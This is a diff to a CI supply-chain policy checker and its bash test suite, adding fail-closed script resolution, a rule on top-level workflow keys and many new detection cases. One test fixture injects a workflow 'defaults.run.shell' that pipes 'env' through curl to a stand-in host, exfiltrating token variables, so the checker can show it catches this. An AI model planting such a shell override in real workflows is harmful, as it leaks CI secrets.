@@ -64,6 +64,8 @@ R_SIGN = r"python3 bin/chain-verify\.py sign --check --signer cosign --digests d
 def judge_sign(path):
     if not os.path.exists(path): return ["missing: " + path]
     d, text = load(path); bad = []
+    extra_top = set(d) - {"name", "on", "permissions", "jobs"}
+    if extra_top: bad.append("AC3: top-level keys %s are not allowed (defaults.run.shell, concurrency, run-name, env can reroute every run step)" % sorted(extra_top))
     on = d.get("on")
     if not isinstance(on, dict) or set(on) != {"workflow_call"}:
         bad.append("AC1: on: must be exactly workflow_call: %s" % on)
@@ -175,7 +177,6 @@ stage-verify.yml supply-chain.yml""".split())
             if any(pv for e in TABLE if re.search(e["regex"], str(r.get("tool", ""))) for pv in [e["prov"] == "always"]): bad.append("AC1: signer list names a provenance signer: %s" % r)
             allowed.setdefault(r.get("file"), set()).add(r.get("tool"))
     acts = glob.glob(os.path.join(base, ".github/actions/**/action.y*ml"), recursive=True) + glob.glob(os.path.join(base, "action.y*ml"))
-    scripts = {}
     def check(rel, text, who):
         for e, pv, line in signer_calls(text):
             if rel == "stage-sign.yml": continue
@@ -183,16 +184,16 @@ stage-verify.yml supply-chain.yml""".split())
                 bad.append("AC1: %s%s signs provenance (%s: %s); only stage-sign.yml may" % (rel, who, e["name"], line[:80]))
             elif e["name"] not in allowed.get(rel, set()):
                 bad.append("AC1: %s%s calls %r, which is not listed with a reason in chain-signers.json" % (rel, who, e["name"]))
+    texts = {}
     for f in files + sorted(acts):
         rel = os.path.relpath(f, wfdir) if f in files else os.path.relpath(f, base)
-        text = open(f).read()
+        text = open(f).read(); texts[os.path.relpath(f, base)] = text
         check(rel, text, "")
-        for sp in _cts.script_refs(text):
-            scripts.setdefault(sp, set()).add(rel)
+    scripts, serrs = _cts.reachable_scripts(base, texts)
+    for x in serrs: bad.append("AC1: unresolved script reference (fail closed): " + x)
     for sp, by in sorted(scripts.items()):
-        full = os.path.join(base, sp)
-        if sp == "bin/chain-verify.py" or not os.path.isfile(full): continue
-        check(sp, open(full).read(), " (run by %s)" % ", ".join(sorted(by)))
+        if sp == "bin/chain-verify.py": continue
+        check(sp, open(os.path.join(base, sp), errors="replace").read(), " (run by %s)" % ", ".join(sorted(by)))
     return bad
 
 def judge_calls(root):
@@ -274,7 +275,7 @@ mutate() {
   python3 - "$good" "$work/$(printf '%s' "$1" | tr -c 'A-Za-z0-9' _).yml" "$2" "$3" <<'PY' || { failn=$((failn + 1)); echo "FAIL mutation $1 did not apply to the fixture"; return 1; }
 import re, sys
 t = open(sys.argv[1]).read()
-n = re.sub(sys.argv[3], lambda m: sys.argv[4].encode().decode("unicode_escape"), t, count=1, flags=re.S)
+n = re.sub(sys.argv[3], lambda m: sys.argv[4].replace("\\n", "\n").replace("\\t", "\t"), t, count=1, flags=re.S)
 if n == t: sys.exit(1)
 open(sys.argv[2], "w").write(n)
 PY
@@ -287,6 +288,9 @@ expect ok "fixture: known-good Sign passes the judge" sign "$good"
 caught "AC1 self-hosted runner" 'ubuntu-24.04' 'self-hosted'
 caught "AC1 extra trigger" 'workflow_call:' 'push:\n  workflow_call:'
 caught "AC1 second job" '    steps:' '    steps: []\n  other:\n    runs-on: ubuntu-24.04\n    steps:'
+caught "AC3 workflow-level defaults.run.shell reroutes every run step (leaks the token variables)" 'permissions:\n  contents: read\njobs' "defaults:\n  run:\n    shell: \"bash -c 'env | curl -d @- https://x.example; bash {0}'\"\npermissions:\n  contents: read\njobs"
+caught "AC3 workflow-level concurrency" 'permissions:\n  contents: read\njobs' "concurrency: x\npermissions:\n  contents: read\njobs"
+caught "AC3 workflow-level run-name" 'permissions:\n  contents: read\njobs' "run-name: x\npermissions:\n  contents: read\njobs"
 caught "AC1 job runs in a container" 'runs-on: ubuntu-24.04' 'runs-on: ubuntu-24.04\n    container: alpine'
 caught "AC2 extra input" 'digests:\n        description' 'script:\n        type: string\n      digests:\n        description'
 caught "AC2 downloads another artifact" 'name: witness-build' 'name: dist'
@@ -358,6 +362,7 @@ mk() {
   local d="$work/$1"; mkdir -p "$d/.github/workflows" "$d/.github/policy" "$d/.github/actions/x" "$d/bin"
   for f in acceptance auditor ci release stage-build stage-promote stage-verify stage-reproducibility; do printf 'jobs: {}\n' > "$d/.github/workflows/$f.yml"; done
   cp "$good" "$d/.github/workflows/stage-sign.yml"
+  printf '#!/usr/bin/env bash\n' > "$d/bin/build.sh"; printf '#!/usr/bin/env bash\n' > "$d/bin/install-scanner.sh"
   printf 'jobs:\n  b:\n    steps:\n      - run: witness run --step build -- ./bin/build.sh\n' > "$d/.github/workflows/stage-build.yml"
   printf 'jobs:\n  d:\n    steps:\n      - run: git -c gpg.x509.program=gitsign tag -s v1\n' > "$d/.github/workflows/release.yml"
   printf '{"signers":[{"file":"stage-build.yml","tool":"witness run","reason":"Build'"'"'s own Witness collection (rule 51)"},{"file":"release.yml","tool":"gitsign","reason":"CI patch tag (REQ-REL-009-AC5)"}]}\n' > "$d/.github/policy/chain-signers.json"
@@ -419,6 +424,55 @@ d=$(mk t_make); printf 'jobs:\n  b:\n    steps:\n      - run: make publish\n' > 
 expect caught "AC1 a Makefile target a workflow runs signs provenance" tree "$d"
 d=$(mk t_js); printf 'jobs:\n  b:\n    steps:\n      - run: node scripts/pub.js\n' > "$d/.github/workflows/stage-verify.yml"; mkdir -p "$d/scripts"; printf 'require("child_process").execSync("cosign sign --yes " + process.env.IMG)\n' > "$d/scripts/pub.js"
 expect caught "AC1 a node script a workflow runs signs an image and is not listed" tree "$d"
+d=$(mk t_attml); printf 'jobs:\n  b:\n    steps:\n      - uses: actions/attest@%s # v4\n        with:\n          subject-path: dist/x\n          predicate-type: https://slsa.dev/provenance/v1\n' "$sha" > "$d/.github/workflows/stage-verify.yml"
+expect caught "AC1 actions/attest with the SLSA predicate-type on a later line is provenance (round 5)" tree "$d"
+d=$(mk t_attvar); printf 'jobs:\n  b:\n    steps:\n      - uses: actions/attest@%s # v4\n        with:\n          predicate-type: ${{ inputs.t }}\n' "$sha" > "$d/.github/workflows/stage-verify.yml"
+expect caught "AC1 actions/attest with an expression predicate-type is provenance (fail closed)" tree "$d"
+d=$(mk t_attok); printf 'jobs:\n  b:\n    steps:\n      - uses: actions/attest@%s # v4\n        with:\n          predicate-type: https://spdx.dev/Document\n' "$sha" > "$d/.github/workflows/stage-verify.yml"
+python3 - "$d" <<'PY'
+import json, sys
+f = sys.argv[1] + "/.github/policy/chain-signers.json"; j = json.load(open(f))
+j["signers"].append({"file": "stage-verify.yml", "tool": "actions/attest", "reason": "SBOM attestation of the image (rule 55)"}); json.dump(j, open(f, "w"))
+PY
+expect ok "AC1 actions/attest with a literal non-provenance predicate-type is fine when listed with a reason" tree "$d"
+d=$(mk t_wvar); printf 'jobs:\n  b:\n    steps:\n      - run: witness run --step build -a "$ATT" -- ./bin/build.sh\n' > "$d/.github/workflows/stage-verify.yml"
+expect caught "AC1 witness run -a \"\$ATT\" (variable attestor list) is provenance (fail closed)" tree "$d"
+d=$(mk t_wexpr); printf 'jobs:\n  b:\n    steps:\n      - run: witness run --step build -a ${{ inputs.att }} -- ./bin/build.sh\n' > "$d/.github/workflows/stage-verify.yml"
+expect caught "AC1 witness run -a \${{ expression }} is provenance (fail closed)" tree "$d"
+d=$(mk t_wfold); printf 'jobs:\n  b:\n    steps:\n      - run: >-\n          witness run --step build\n          -a slsa -- ./bin/build.sh\n' > "$d/.github/workflows/stage-verify.yml"
+expect caught "AC1 witness run with -a slsa on the next line of a folded scalar" tree "$d"
+d=$(mk t_wnext); printf 'jobs:\n  b:\n    steps:\n      - run: |\n          witness run --step build -a\n          slsa -- ./bin/build.sh\n' > "$d/.github/workflows/stage-verify.yml"
+expect caught "AC1 witness run -a with its value on the next line" tree "$d"
+d=$(mk t_wcfg2); printf 'jobs:\n  b:\n    steps:\n      - run: witness run --step build -a product -c witness.yaml -- ./bin/build.sh\n' > "$d/.github/workflows/stage-verify.yml"
+expect caught "AC1 witness run -a product -c cfg.yaml (the config file can add slsa)" tree "$d"
+d=$(mk t_twotype); printf 'jobs:\n  b:\n    steps:\n      - run: cosign attest --yes --type spdx --type slsaprovenance1 --predicate p.json "$IMG"\n' > "$d/.github/workflows/stage-verify.yml"
+expect caught "AC1 cosign attest with repeated --type: the first does not hide the second" tree "$d"
+d=$(mk t_blobprov); printf 'jobs:\n  b:\n    steps:\n      - run: cosign sign-blob --yes provenance.intoto.jsonl --bundle b.json\n' > "$d/.github/workflows/stage-verify.yml"
+expect caught "AC1 cosign sign-blob of a provenance blob is provenance" tree "$d"
+d=$(mk t_sigpy); printf 'jobs:\n  b:\n    steps:\n      - run: python3 -m sigstore attest --predicate p.json dist/x\n' > "$d/.github/workflows/stage-verify.yml"
+expect caught "AC1 the python sigstore CLI attest is a provenance signer" tree "$d"
+d=$(mk t_notation); printf 'jobs:\n  b:\n    steps:\n      - run: notation sign "$IMG"\n' > "$d/.github/workflows/stage-verify.yml"
+expect caught "AC1 notation sign is a known signer that must be listed" tree "$d"
+d=$(mk t_intoto); printf 'jobs:\n  b:\n    steps:\n      - run: in-toto-run --step-name build -- ./x\n' > "$d/.github/workflows/stage-verify.yml"
+expect caught "AC1 in-toto-run is a known signer that must be listed" tree "$d"
+d=$(mk t_ws); printf 'jobs:\n  b:\n    steps:\n      - run: bash "$GITHUB_WORKSPACE/bin/pub.sh"\n' > "$d/.github/workflows/stage-verify.yml"; printf '#!/usr/bin/env bash\ncosign attest --yes --type slsaprovenance1 --predicate p.json "$IMG"\n' > "$d/bin/pub.sh"
+expect caught "AC1 bash \"\$GITHUB_WORKSPACE/bin/pub.sh\" is resolved and its provenance signing seen" tree "$d"
+d=$(mk t_ws2); printf 'jobs:\n  b:\n    steps:\n      - run: bash ${{ github.workspace }}/bin/pub.sh\n' > "$d/.github/workflows/stage-verify.yml"; printf '#!/usr/bin/env bash\ncosign sign --yes "$IMG"\n' > "$d/bin/pub.sh"
+expect caught "AC1 bash \${{ github.workspace }}/bin/pub.sh is resolved" tree "$d"
+d=$(mk t_cdp); mkdir -p "$d/scripts"; printf 'jobs:\n  b:\n    steps:\n      - run: cd scripts && ./pub.sh\n' > "$d/.github/workflows/stage-verify.yml"; printf '#!/usr/bin/env bash\ncosign sign --yes "$IMG"\n' > "$d/scripts/pub.sh"
+expect caught "AC1 cd scripts && ./pub.sh is resolved through the cd prefix" tree "$d"
+d=$(mk t_noext); printf 'jobs:\n  b:\n    steps:\n      - run: ./bin/publish\n' > "$d/.github/workflows/stage-verify.yml"; printf '#!/usr/bin/env bash\ncosign sign --yes "$IMG"\n' > "$d/bin/publish"; chmod +x "$d/bin/publish"
+expect caught "AC1 an extensionless script that starts with #! is scanned" tree "$d"
+d=$(mk t_pym); mkdir -p "$d/tools"; printf 'jobs:\n  b:\n    steps:\n      - run: python3 -m tools.pub\n' > "$d/.github/workflows/stage-verify.yml"; printf 'import os\nos.system("cosign sign --yes " + os.environ["IMG"])\n' > "$d/tools/pub.py"
+expect caught "AC1 python3 -m tools.pub is resolved to tools/pub.py" tree "$d"
+d=$(mk t_trans); printf 'jobs:\n  b:\n    steps:\n      - run: bash bin/a.sh\n' > "$d/.github/workflows/stage-verify.yml"; printf '#!/usr/bin/env bash\nbash "$(dirname "$0")/b.sh"\n' > "$d/bin/a.sh"; printf '#!/usr/bin/env bash\ncosign sign --yes "$IMG"\n' > "$d/bin/b.sh"
+expect caught "AC1 a script that calls another script is followed (bin/a.sh -> bin/b.sh)" tree "$d"
+d=$(mk t_unres); printf 'jobs:\n  b:\n    steps:\n      - run: bash "$SOME_DIR/pub.sh"\n' > "$d/.github/workflows/stage-verify.yml"
+expect caught "AC1 a script path in an unknown variable is an error naming the workflow (fail closed)" tree "$d"
+d=$(mk t_gone); printf 'jobs:\n  b:\n    steps:\n      - run: bash bin/gone.sh\n' > "$d/.github/workflows/stage-verify.yml"
+expect caught "AC1 a script reference with no such file is an error (fail closed)" tree "$d"
+d=$(mk t_heredoc); printf 'jobs:\n  b:\n    steps:\n      - run: |\n          cat > x.sh <<EOF\n          cosign sign --yes img\n          EOF\n' > "$d/.github/workflows/stage-verify.yml"
+expect caught "AC1 a signing call written inside a heredoc of a workflow step is still seen" tree "$d"
 d=$(mk t_new); cp "$good" "$d/.github/workflows/stage-extra.yml"
 expect caught "AC1 a second new workflow file" tree "$d"
 d=$(mk t_noreason); sed -i.bak 's/"reason":"CI patch tag (REQ-REL-009-AC5)"/"reason":" "/' "$d/.github/policy/chain-signers.json"
@@ -445,7 +499,7 @@ expect ok "the real stage-sign.yml passes the Sign judge" sign "$root/.github/wo
 expect ok "the real stage-build.yml's signing steps take nothing from a secret" build "$root/.github/workflows/stage-build.yml"
 expect ok "the real tree: only stage-sign.yml is new and only it signs provenance" tree "$root"
 expect ok "the real tree: only release.yml calls stage-sign.yml and no stage calls a stage (003-AC5; green already: scan.yml and main-candidate-rescan.yml are non-stage callers)" calls "$root"
-EXPECT=97
+EXPECT=122
 echo "pass=$pass fail=$failn"
 if [ $((pass + failn)) != "$EXPECT" ]; then echo "FAIL case count $((pass + failn)) != expected $EXPECT (a case was skipped or added)"; exit 1; fi
 [ "$failn" = 0 ]
